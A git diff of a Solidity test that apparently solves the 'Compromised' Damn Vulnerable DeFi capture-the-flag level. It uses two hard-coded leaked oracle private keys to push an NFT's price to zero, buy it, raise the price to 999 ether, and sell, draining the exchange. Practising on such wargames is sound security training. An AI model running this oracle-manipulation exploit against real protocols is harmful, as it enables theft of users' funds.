@@ -10,6 +10,8 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -75,7 +77,41 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // hexified base64 encoding of the private keys are provided
+        address source_1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address source_2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        assertEq(source_1, sources[0]);
+        assertEq(source_2, sources[1]);
+        vm.prank(source_1);
+        oracle.postPrice(symbols[0], 0);
+        vm.prank(source_2);
+        oracle.postPrice(symbols[0], 0);
+
+        uint256 id = exchange.buyOne{value: 0.1 ether}();
+
+        vm.prank(source_1);
+        oracle.postPrice(symbols[0], 999 ether);
+        vm.prank(source_2);
+        oracle.postPrice(symbols[0], 999 ether);
+
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
         
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {
+        if (msg.value > 1 ether) {
+            payable(recovery).transfer(msg.value); 
+        }
     }
 
     /**
